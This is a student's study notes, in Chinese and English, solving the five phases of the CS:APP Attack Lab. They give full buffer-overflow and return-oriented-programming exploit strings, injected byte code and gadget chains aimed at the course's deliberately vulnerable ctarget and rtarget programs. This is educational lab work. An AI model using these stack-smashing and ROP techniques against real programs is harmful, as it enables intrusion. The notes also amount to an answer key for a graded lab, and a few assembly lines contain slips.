---
attachments: [Clipboard_2022-06-02-16-04-16.png, Clipboard_2022-06-03-16-32-02.png, Clipboard_2022-06-03-16-32-51.png, Clipboard_2022-06-03-16-42-08.png]
tags: [csapp/05-09]
title: Attack lab
created: '2022-06-01T15:17:07.722Z'
modified: '2022-06-03T15:36:56.537Z'
---

# Attack lab
 
 + [实验说明-视频](https://www.bilibili.com/video/BV1a54y1k7YE?p=12)
 + [writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
 + Code Injection Attacks

        vim foo.s
        mov %rax, %rdx
        add $ox5, %rdx
        retq

        gcc -c foo.s
        objdump -d foo. > foo
        vim foo
        //use gcc and objdump to generate byte codes for assembly instruction sequences
        ./hex2raw -h
        ./hex2raw -i foo

 + Return-Oriented Programming

        gcc -c farm.c
        objdump -d farm.o > farm

    > tips:
          1.draw stack diagrams
          2.careful byte ording(litte endian)


1. phase1
     > For Phase 1, you will not inject new code. Instead, your exploit string will       redirect the program to execute an existing procedure.
       Function getbuf is called within CTARGET by a function test having the following C code:

        void test()
        {
        int val;
        val = getbuf();
        printf("No exploit. Getbuf returned 0x%x\n", val);
        }

     > When getbuf executes its return statement (line 5 of getbuf), the program          ordinarily resumes execution within function test (at line 5 of this function).    We want to change this behavior. Within the file ctarget,there is code for a       function touch1 having the following C representation:
 
        void touch1()
        {
        vlevel = 1; /* Part of validation protocol */
        printf("Touch1!: You called touch1()\n");
        validate(1);
        exit(0);
        }

     > Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

    > 要求：getbuf 返回后执行touch1.
    方法：将getbuf返回地址修改为touch1的地址。

        00000000004017a8 <getbuf>:
        4017a8:	48 83 ec 28          	sub    $0x28,%rsp
        4017ac:	48 89 e7             	mov    %rsp,%rdi
        4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
        4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
        4017b9:	48 83 c4 28          	add    $0x28,%rsp
        4017bd:	c3                   	retq   
        4017be:	90                   	nop
        4017bf:	90                   	nop
        //getbuf()分配的栈空间为0x28 = 40byte

        00000000004017c0 <touch1>:
        4017c0:	48 83 ec 08          	sub    $0x8,%rsp
        4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
        4017cb:	00 00 00 
        4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
        4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
        4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
        4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
        4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
        4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
        //touch1的地址为0x4017c0

        0000000000401968 <test>:
        401968:	48 83 ec 08          	sub    $0x8,%rsp
        40196c:	b8 00 00 00 00       	mov    $0x0,%eax
        401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf> 
        401976:	89 c2                	mov    %eax,%edx
        401978:	be 88 31 40 00       	mov    $0x403188,%esi
        40197d:	bf 01 00 00 00       	mov    $0x1,%edi
        401982:	b8 00 00 00 00       	mov    $0x0,%eax
        401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
        40198c:	48 83 c4 08          	add    $0x8,%rsp
        401990:	c3                   	retq   
        // 执行getbuf后返回地址本来为 0x401976, 利用缓冲区溢出，将返回地址改为touch1的地址为0x4017c0。
        // 任意字节填充前40byte，

  ![](@attachment/Clipboard_2022-06-02-16-04-16.png)
  
        level1.txt
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        c0 17 40 00 00 00 00 00

        ./hex2raw -i level1.txt | ./ctarget -q

2. phase2

    > Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:

        void touch2(unsigned val)
        {
            vlevel = 2; /* Part of validation protocol */
            if (val == cookie) {
            printf("Touch2!: You called touch2(0x%.8x)\n", val);
            validate(2);
            } else {
            printf("Misfire: You called touch2(0x%.8x)\n", val);
            fail(2);
            }
            exit(0);
        }
   > Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.

   > Some Advice:
    • You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.
    • Recall that the first argument to a function is passed in register %rdi.
    • Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.
    • Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.
    • See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.

        00000000004017ec <touch2>:
        4017ec:	48 83 ec 08          	sub    $0x8,%rsp
        ...

    > touch2地址：0x4017ec
    > 将cookie：0x59b997fa保存到rdi

          注入代码：
          lea $0x59b997fa %rdi
          push $0x4017ec
          ret

          0000000000000000 <.text>:
          0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi // cooki in %rdi
          7:	68 ec 17 40 00       	pushq  $0x4017ec //touch2 地址
          c:	c3                   	retq  

    > 在getbuf()查看%rsp
      (gdb) print $rsp
      $3 = (void *) 0x5561dc78

      方法：将getbuf的返回地址改为%rsp地址，在%rsp添加注入代码。

      level2.txt:

        48 c7 c7 fa 97 b9 59 68      /* 注入代码 */
        ec 17 40 00 c3 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        78 dc 61 55 00 00 00 00      /* 返回地址设置为getbuf的栈顶 */

        ./hex2raw -i level2.txt | ./ctarget -q

3. phase3

    > Phase 3 also involves a code injection attack, but passing a string as argument.
Within the file ctarget there is code for functions hexmatch and touch3 having the following Crepresentations:

        /* Compare string to hex represention of unsigned value */
        int hexmatch(unsigned val, char *sval)
        {
          char cbuf[110];
          /* Make position of check string unpredictable */
          char *s = cbuf + random() % 100;
          sprintf(s, "%.8x", val);
          return strncmp(sval, s, 9) == 0;
        }

         void touch3(char *sval)
        {
          vlevel = 3; /* Part of validation protocol */
          if (hexmatch(cookie, sval)) {
          printf("Touch3!: You called touch3(\"%s\")\n", sval);
          validate(3);
        } else {
          printf("Misfire: You called touch3(\"%s\")\n", sval);
          fail(3);
          }
          exit(0);
        }

    > Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

    > Some Advice:
      • You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
      • Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.
      • Your injected code should set register %rdi to the address of this string.
      • When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.

          00000000004018fa <touch3>:
          4018fa:	53                   	push   %rbx
          4018fb:	48 89 fb             	mov    %rdi,%rbx  
    
    > touch3地址: 0x4018fa
    > cookie：0x59b997fa字符串表示形式：35 39 62 39 39 37 66 61 
    > getbuf栈顶地址：0x5561dc78
      **因为getbuf栈帧可能被hexmatch和strncmp覆盖，所以字符串不能存在getbuf栈帧，应该存在text的栈帧**

        在test调用getbuf前查看%rsp
        (gdb) print $rsp
        $1 = (void *) 0x5561dca8
        将改地址用来保存字符串

        movq $0x5561dca8,%rdi //%rdi 保存字符串地址， 
        push $0x4018fa //转移到touch3
        ret

        0000000000000000 <.text>:
        0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
        7:	68 fa 18 40 00       	pushq  $0x4018fa
        c:	c3                   	retq   

        level3.txt:
        48 c7 c7 a8 dc 61 55 68      /* 注入代码 */
        fa 18 40 00 c3 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        78 dc 61 55 00 00 00 00      /* 返回地址,即getbuf的栈顶 */
        35 39 62 39 39 37 66 61      /* 字符串 */

        ./hex2raw -i level3.txt | ./ctarget -q

        + 一个疑惑点解答：大小端是具多个字节数据的内部排列顺序
        > 对于ascii的字符串，它的基本数据类型是char，占据一个字节，不存在内部，按字符从高到低排序。
          对于如int型这样占据多个字节的数据，才有大小端之分。
          int a[3] = [1, 2, 3]
          小端：01 00 00 00 02 00 00 00 03 00 00 00
          大端：00 00 00 01 00 00 00 02 00 00 00 03

4. phase4

    > For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).
    movq : The codes for these are shown in Figure 3A.
    popq : The codes for these are shown in Figure 3B.
    ret : This instruction is encoded by the single byte 0xc3.
    nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.

    > Some Advice:
      • All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.
      • You can do this attack with just two gadgets.
      • When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.

    > 任务和phase2相同，执行完getbuf后，转去执行touch2，同时将cookie存到%rdi作为touch2的参数，不过不能使用代码注入。要使用已有的指令（也就是gadget）

    > touch2地址：0x4017ec
    > cookie：0x59b997fa
    
    在start_farm和mid_farm中间找满足需要的指令：
    ![](@attachment/Clipboard_2022-06-03-16-42-08.png)
    ![](@attachment/Clipboard_2022-06-03-16-32-51.png)
    
        00000000004019a7 <addval_219>:
        4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
        4019ad:	c3                   	retq  
    
  + 58 90 c3 -> 90可以忽略，pop %rax;ret;

        00000000004019a0 <addval_273>:
        4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
        4019a6:	c3                   	retq   

  + 48 89 c7 c3 -> movq %rax, %rdi; ret;

        0x4017ec
        movq %rax,%rdi ->地址：0x4019a2
        0x59b997fa
        popq %rax ->地址：0x4019ab

        00 00 00 00 00 00 00 00    
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        ab 19 40 00 00 00 00 00      /* pop %rax;ret地址 */
        fa 97 b9 59 00 00 00 00      /* cookie值 */
        a2 19 40 00 00 00 00 00      /*  movq %rax,%rdi;ret地址 */
        ec 17 40 00 00 00 00 00      /* touch2地址 */ 

        ./hex2raw -i phase4.txt | ./rtarget -q

5. phase_5
   
    > touch3地址: 0x4018fa
    > cookie：0x59b997fa字符串表示形式：35 39 62 39 39 37 66 61 
    > getbuf栈顶地址：0x5561dc78
    

    > 分析：按照level3的写法，我们可能会尝试把cookie值放在更深的栈里，然后hardcode这个cookie值的地址。但是实际上是不行的，原因是，做了栈随机化，我们只能拿到rsp的地址后，动态地进行偏移。

    > 步骤：
      1. 拿到%rsp的地址
      2. %rsp + 偏移量，指向cookie
      3. 把这个地址放到%rdi
      4. 调用touch

        35 39 62 39 39 37 66 61  // cooki字符串
        0x4018fa                 //touch3地址
        movq %rax, %rdi;ret;     //将cookie地址放入%rdi
        lea  (%rdi, %rsi, 1), %rax;ret; //%rsp + 偏移量 —>cookie地址
        movq %rax,%rdi;ret;
        movq %rsp,%rax;ret;     //取%rsp，rsp在该条指令的下一条，所以相对于cooki偏移量为0x20；
        movl %ecx, %esi;ret;    //将偏移量放入%esi
        movl %edx, %ecx;ret;
        movl %eax, %edx;ret;    //
        0x20                    //偏移量
        popq %rax

        00000000004019a7 <addval_219>:
        4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
        4019ad:	c3                   	retq  
        + 4019ab:58 90 c3 -> popq %rax;ret;

        00000000004019db <getval_481>:
        4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
        4019e0:	c3                   	retq   
        + 4019dd:89 c2 90 c3 -> movl %eax, %edx;ret;

        0000000000401a68 <getval_311>:
        401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
        401a6d:	c3                   	retq  
        + 401a69: 89 d1 -> movl %edx, %ecx; 08 db -> orb %bl, %bl;//无影响 ret;

        0000000000401a11 <addval_436>:
        401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
        401a17:	c3                   	retq   
        + 401a13: 89 ce 90 90 c3 -> movl %ecx, %esi;ret;


        0000000000401a03 <addval_190>:
        401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
        401a09:	c3                   	retq     
        + 401a06:48 89 e0 c3 -> movq %rsp, %rax;ret

        00000000004019a0 <addval_273>:
        4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
        4019a6:	c3                   	retq   
        + 4019a2: 48 89 c7 c3 -> movl %rax, %rdi;ret;

        00000000004019d6 <add_xy>:
        4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
        4019da:	c3                   	retq   
        + 4019d6:	48 8d 04 37 -> lea    (%rdi,%rsi,1),%rax
        
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00
        ab 19 40 00 00 00 00 00  /*  popq %rax */
        20 00 00 00 00 00 00 00  /* 偏移量 */
        dd 19 40 00 00 00 00 00  /* movl %eax, %edx;ret; */
        69 1a 40 00 00 00 00 00  /* movl %edx, %ecx;ret; */
        13 1a 40 00 00 00 00 00  /* movl %ecx, %esi;ret; */
        06 1a 40 00 00 00 00 00  /* movq %rsp, %rax;ret */
        a2 19 40 00 00 00 00 00  /* movl %rax, %rdi;ret; */
        d6 19 40 00 00 00 00 00  /* lea (%rdi,%rsi,1),%rax */
        a2 19 40 00 00 00 00 00  /* movl %rax, %rdi;ret; */
        fa 18 40 00 00 00 00 00  /* touch3 address */
        35 39 62 39 39 37 66 61  /* cooki字符串 */

        ./hex2raw -i phase5.txt | ./rtarget -q

